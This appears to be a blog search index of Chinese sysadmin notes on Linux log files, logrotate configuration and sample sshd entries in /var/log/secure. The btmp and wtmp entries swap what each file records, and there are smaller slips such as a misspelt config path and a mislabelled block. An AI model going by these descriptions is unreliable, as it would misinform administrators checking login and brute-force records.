<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>log_btmp</title>
    <link href="/2024/04/01/yunwei/log/log_btmp/"/>
    <url>/2024/04/01/yunwei/log/log_btmp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;btmp 主要是系统记录所有登录成功信息</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS、Ubuntu等系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>二进制文件</p><h3 id="文件权限-644"><a href="#文件权限-644" class="headerlink" title="文件权限 644"></a>文件权限 644</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp<br>-rw-rw-r--. 1 root utmp 76800 8月  25 10:08 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp<br></code></pre></td></tr></table></figure><h2 id="日志作用"><a href="#日志作用" class="headerlink" title="日志作用"></a>日志作用</h2><p>last 命令默认数据来源，也就是说默认通过 last 查看数据</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_dmesg</title>
    <link href="/2024/04/01/yunwei/log/log_dmesg/"/>
    <url>/2024/04/01/yunwei/log/log_dmesg/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;dmesg* 主要是系统记录关于开机信息的日志</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><h3 id="文件权限-644"><a href="#文件权限-644" class="headerlink" title="文件权限 644"></a>文件权限 644</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 34655 </span>4月  <span class="hljs-number"> 1 </span>15:30 dmesg<br></code></pre></td></tr></table></figure><h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><h2 id="常见动作的日志"><a href="#常见动作的日志" class="headerlink" title="常见动作的日志"></a>常见动作的日志</h2><h2 id="待研究问题"><a href="#待研究问题" class="headerlink" title="待研究问题"></a>待研究问题</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_set</title>
    <link href="/2024/04/01/yunwei/log/log_set/"/>
    <url>/2024/04/01/yunwei/log/log_set/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>日志作为系统中很重要的一部分，对日志配置的研究有助于进一步了解日志</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h3><h4 id="设置日志文件大小"><a href="#设置日志文件大小" class="headerlink" title="设置日志文件大小"></a>设置日志文件大小</h4><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>&#x2F;etc&#x2F;logrogtate.conf</p><p>&#x2F;etc&#x2F;logrotate.d&#x2F;</p><h5 id="日志配置字段说明"><a href="#日志配置字段说明" class="headerlink" title="日志配置字段说明"></a>日志配置字段说明</h5><h6 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h6><p>独立设置的日志格式配置优先于通用格式配置</p><p>例如：&#x2F;etc&#x2F;logrotate.d&#x2F;里的会优先于&#x2F;etc&#x2F;logrogtate.conf里的配置</p><p>&#x2F;etc&#x2F;logrogtate.conf 里的独立配置也会优先于通用配置，wtmp 和 btmp日志会按照独立的配置执行，例如按月转储，只保留1个</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">weekly<br><span class="hljs-keyword">rotate</span> 4<br>create<br>dateext<br><span class="hljs-keyword">include</span> /etc/logrotate.<span class="hljs-keyword">d</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp &#123;<br>    monthly<br>    create 0664 root utmp<br>minsize 1M<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create 0600 root utmp<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="weekly"><a href="#weekly" class="headerlink" title="weekly"></a>weekly</h6><p>每周转储一次，也就是每周生成一个日志文件</p><h6 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h6><p>每天转储一次，也就是每天生成一个日志文件</p><h6 id="monthly"><a href="#monthly" class="headerlink" title="monthly"></a>monthly</h6><p>每月转储一次，也就是每月生成一个日志文件</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls /var/log/secure* -lat</span><br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 21008467 </span>4月  <span class="hljs-number"> 1 </span>16:02 /var/log/secure<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 96609789 </span>3月 <span class="hljs-number"> 31 </span>03:20 /var/log/secure-20240331<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98212385 </span>3月 <span class="hljs-number"> 24 </span>03:21 /var/log/secure-20240324<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98575554 </span>3月 <span class="hljs-number"> 17 </span>03:13 /var/log/secure-20240317<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 100238540 </span>3月 <span class="hljs-number"> 10 </span>03:38 /var/log/secure-20240310<br></code></pre></td></tr></table></figure><h6 id="rotate-num"><a href="#rotate-num" class="headerlink" title="rotate  num"></a>rotate  num</h6><p>保存num个备份文件</p><p>&#x2F;var&#x2F;log&#x2F;secure-20240331 &#x2F;var&#x2F;log&#x2F;secure-20240324 &#x2F;var&#x2F;log&#x2F;secure-20240317 &#x2F;var&#x2F;log&#x2F;secure-20240310</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls /var/log/secure* -lat</span><br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 21008467 </span>4月  <span class="hljs-number"> 1 </span>16:02 /var/log/secure<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 96609789 </span>3月 <span class="hljs-number"> 31 </span>03:20 /var/log/secure-20240331<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98212385 </span>3月 <span class="hljs-number"> 24 </span>03:21 /var/log/secure-20240324<br>-rw-------<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 98575554 </span>3月 <span class="hljs-number"> 17 </span>03:13 /var/log/secure-20240317<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 100238540 </span>3月 <span class="hljs-number"> 10 </span>03:38 /var/log/secure-20240310<br></code></pre></td></tr></table></figure><h6 id="dateext"><a href="#dateext" class="headerlink" title="dateext"></a>dateext</h6><p>在转储后的文件名中增加日期</p><p>secure-20240331</p><h6 id="dateformat-Y-m-d"><a href="#dateformat-Y-m-d" class="headerlink" title="dateformat .%Y-%m-%d"></a>dateformat .%Y-%m-%d</h6><p>自定义转储后增加的日期格式</p><h6 id="dateyesterday"><a href="#dateyesterday" class="headerlink" title="dateyesterday"></a>dateyesterday</h6><p>设置新增加的日期均为昨天</p><p>例如：2024年4月1日转储的文件，文件中的日期将为2024-03-30，而不是2024.04.01</p><h6 id="missingok"><a href="#missingok" class="headerlink" title="missingok"></a>missingok</h6><p>如果日志文件丢失，则忽略并继续转储</p><h6 id="create-0644-root-root"><a href="#create-0644-root-root" class="headerlink" title="create 0644 root root"></a>create 0644 root root</h6><p>创建新的转储后的日志文件权限</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create <span class="hljs-number">0600</span> root utmp<br>    <span class="hljs-built_in">rotate</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 log]<span class="hljs-comment"># ls -lat btmp*</span><br>-rw-------<span class="hljs-number"> 1 </span>root utmp   <span class="hljs-number"> 1536 </span>4月  <span class="hljs-number"> 1 </span>15:16 btmp<br>-rw-------<span class="hljs-number"> 1 </span>root utmp<span class="hljs-number"> 1031808 </span>4月  <span class="hljs-number"> 1 </span>01:40 btmp-20240401<br></code></pre></td></tr></table></figure><p>create 0600 root utmp 表示 utmp 日志文件的权限为 6(r+w)00，用户为root，属组信息为 utmp</p><h6 id="minsize-xxM"><a href="#minsize-xxM" class="headerlink" title="minsize xxM"></a>minsize xxM</h6><p>日志文件必需达到指定大小才执行转储策略</p><p>当日志文件大小小于指定的值时，不会进行转储</p><p>到日志文件大小达到或超过指定的值时，将按照其他的转储条件执行操作（如size、rotate）</p><p>通常用于避免对过小的日志文件进行转储，因为转储过程可能会导致数据丢失或不必要的系统开销</p><h6 id="size-xxM"><a href="#size-xxM" class="headerlink" title="size xxM"></a>size xxM</h6><p>日志文件达到指定文件大小才执行转储策略</p><p>当日志大小达到或超过指定的大小时，将触发转储操作</p><p>当日志大小没有达到指定的大小时，将不会触发转储操作</p><h6 id="notifempty"><a href="#notifempty" class="headerlink" title="notifempty"></a>notifempty</h6><p>如果日志文件为空，则不转储</p><h6 id="compress"><a href="#compress" class="headerlink" title="compress"></a>compress</h6><p>压缩转储之后的日志文件</p><h6 id="sharedscripts"><a href="#sharedscripts" class="headerlink" title="sharedscripts"></a>sharedscripts</h6><p>每次转储文件时是否应该执行一次脚本</p><p>设置为TRUE时，会在所有相关文件转储后执行一次脚本，会在access.log和error.log都转储完成后，执行一次脚本</p><p>设置为FALSE时，会在每个日志文件转储后执行脚本，会在access.log转储完执行一次，在error.log转储完执行一次</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">(base) [root@aliyun<span class="hljs-number">-1</span>_1_1_1 nginx]# <span class="hljs-keyword">ls</span><br>access.<span class="hljs-keyword">log</span>  <span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span>  <span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span><span class="hljs-number">-20230810</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>*.log &#123;<br>    create <span class="hljs-number">0640</span> nginx root<br>    daily<br>    rotate <span class="hljs-number">10</span><br>    missingok<br>    notifempty<br>    compress<br>    delaycompress<br>    sharedscripts<br>    postrotate<br>        <span class="hljs-regexp">/bin/</span>kill -USR1 `cat <span class="hljs-regexp">/run/</span>nginx.pid <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>` <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> || <span class="hljs-keyword">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="postrotate"><a href="#postrotate" class="headerlink" title="postrotate"></a>postrotate</h6><p>执行的脚本</p><h6 id="endscript"><a href="#endscript" class="headerlink" title="endscript"></a>endscript</h6><p>标记前面定义的 prerotate 或 postrotate 段落的结束</p><h4 id="默认配置"><a href="#默认配置" class="headerlink" title="默认配置"></a>默认配置</h4><h5 id="logrotate-conf"><a href="#logrotate-conf" class="headerlink" title="logrotate.conf"></a>logrotate.conf</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata">weekly<br><span class="hljs-keyword">rotate</span> 4<br>create<br>dateext<br><span class="hljs-keyword">include</span> /etc/logrotate.<span class="hljs-keyword">d</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp &#123;<br>    monthly<br>    create 0664 root utmp<br>minsize 1M<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp &#123;<br>    missingok<br>    monthly<br>    create 0600 root utmp<br>    <span class="hljs-keyword">rotate</span> 1<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-bootlog"><a href="#logrotate-d-bootlog" class="headerlink" title="logrotate.d&#x2F;bootlog"></a>logrotate.d&#x2F;bootlog</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span><br>&#123;<br>    missingok<br>    daily<br>    copytruncate<br>    <span class="hljs-keyword">rotate</span> 7<br>    notifempty<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-chrony"><a href="#logrotate-d-chrony" class="headerlink" title="logrotate.d&#x2F;chrony"></a>logrotate.d&#x2F;chrony</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/chrony/</span>*.log &#123;<br>    missingok<br>    nocreate<br>    sharedscripts<br>    postrotate<br>        <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/chronyc cyclelogs &gt; /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> || <span class="hljs-keyword">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-firewalld"><a href="#logrotate-d-firewalld" class="headerlink" title="logrotate.d&#x2F;firewalld"></a>logrotate.d&#x2F;firewalld</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/firewalld &#123;<br>    weekly<br>    missingok<br>    <span class="hljs-built_in">rotate</span> <span class="hljs-number">4</span><br>    copytruncate<br>    minsize <span class="hljs-number">1</span>M<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-firewalld-1"><a href="#logrotate-d-firewalld-1" class="headerlink" title="logrotate.d&#x2F;firewalld"></a>logrotate.d&#x2F;firewalld</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/maillog<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/messages<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/spooler<br>&#123;<br>    missingok<br>    sharedscripts<br>    postrotate<br>/bin/kill -HUP <span class="hljs-string">`cat /var/run/syslogd.pid 2&gt; /dev/null`</span> <span class="hljs-number">2</span>&gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> || <span class="hljs-literal">true</span><br>    endscript<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-wpa-supplicant"><a href="#logrotate-d-wpa-supplicant" class="headerlink" title="logrotate.d&#x2F;wpa_supplicant"></a>logrotate.d&#x2F;wpa_supplicant</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/wpa_supplicant.<span class="hljs-built_in">log</span> &#123;<br>    missingok<br>    notifempty<br>    size <span class="hljs-number">30</span>k<br>    create <span class="hljs-number">0600</span> root root<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="logrotate-d-yum"><a href="#logrotate-d-yum" class="headerlink" title="logrotate.d&#x2F;yum"></a>logrotate.d&#x2F;yum</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/yum.<span class="hljs-built_in">log</span> &#123;<br>    missingok<br>    notifempty<br>    maxsize <span class="hljs-number">30</span>k<br>    yearly<br>    create <span class="hljs-number">0600</span> root root<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_wtmp</title>
    <link href="/2024/04/01/yunwei/log/log_wtmp/"/>
    <url>/2024/04/01/yunwei/log/log_wtmp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;wtmp 主要是系统记录所有登录失败信息</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS、Ubuntu等系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>二进制文件</p><h3 id="文件权限-600"><a href="#文件权限-600" class="headerlink" title="文件权限 600"></a>文件权限 600</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ <span class="hljs-keyword">log</span>]# <span class="hljs-keyword">ls</span> -lat /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br>-rw------- 1 root utmp 52224 8月  25 04:36 /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp<br></code></pre></td></tr></table></figure><h2 id="日志作用"><a href="#日志作用" class="headerlink" title="日志作用"></a>日志作用</h2><p>lastb 命令默认数据来源，也就是说默认通过 lastb 查看数据</p><p>常用于判断是否存在SSH暴力破解</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_secure</title>
    <link href="/2024/03/29/yunwei/log/log_secure/"/>
    <url>/2024/03/29/yunwei/log/log_secure/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;secure* 主要是CentOS系统记录关于安全的日志</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>&#x2F;etc&#x2F;rsyslog.conf</p><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">authpriv.*                                              <span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/secure<br></code></pre></td></tr></table></figure><p>设备 authpriv 的所有除 none 消息都会写入 &#x2F;var&#x2F;log&#x2F;secure* 这个文件</p><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><h3 id="文件权限-600"><a href="#文件权限-600" class="headerlink" title="文件权限 600"></a>文件权限 600</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 78815387 </span>3月 <span class="hljs-number"> 29 </span>19:52 secure<br></code></pre></td></tr></table></figure><h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><p>时间 主机名（日志主机） 服务名[进程号] 日志信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">24</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">03</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">15314</span>]: Failed password for root from <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">36984</span> ssh2<br></code></pre></td></tr></table></figure><p>时间：Mar 24 03:55:03</p><p>主机名：aliyun-1_1_1_1</p><p>服务名[进程号]：sshd[15314]</p><p>日志信息：Failed password for root from 8.6.5.1 port 36984 ssh2</p><h2 id="常见动作的日志"><a href="#常见动作的日志" class="headerlink" title="常见动作的日志"></a>常见动作的日志</h2><h3 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h3><p>日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">46</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Accepted password for root from <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span> ssh2<br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">46</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: pam_unix(sshd:session): session opened for user root by (uid=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>进程</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 ~]<span class="hljs-comment"># ps -ef | grep sshd | grep 18741</span><br>root    <span class="hljs-number"> 18741 </span><span class="hljs-number"> 1096 </span><span class="hljs-number"> 0 </span>19:58 ?        00:00:00 sshd: root@pts/2<br></code></pre></td></tr></table></figure><p>网络连接</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 ~]<span class="hljs-meta"># netstat -anlp | grep ssh | grep 18741</span><br>tcp        <span class="hljs-number">0</span>     <span class="hljs-number">36</span> <span class="hljs-number">172.17</span><span class="hljs-number">.142</span><span class="hljs-number">.212</span>:<span class="hljs-number">22</span>       <span class="hljs-number">8.6</span><span class="hljs-number">.5</span><span class="hljs-number">.1</span>:<span class="hljs-number">9956</span>      ESTABLISHED <span class="hljs-number">18741</span>/sshd: root<span class="hljs-symbol">@pt</span><br></code></pre></td></tr></table></figure><h3 id="用户退出"><a href="#用户退出" class="headerlink" title="用户退出"></a>用户退出</h3><p>日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Received disconnect from  <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span>:<span class="hljs-number">11</span>: disconnected by user<br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Disconnected from  <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span><br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: pam_unix(sshd:session): session closed for user root<br></code></pre></td></tr></table></figure><h2 id="待研究问题"><a href="#待研究问题" class="headerlink" title="待研究问题"></a>待研究问题</h2><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><p>log_set 文档</p><p>pam_unix研究</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logikm_vuln</title>
    <link href="/2024/03/29/security/secvulns/logikm/logikm_vuln/"/>
    <url>/2024/03/29/security/secvulns/logikm/logikm_vuln/</url>
    
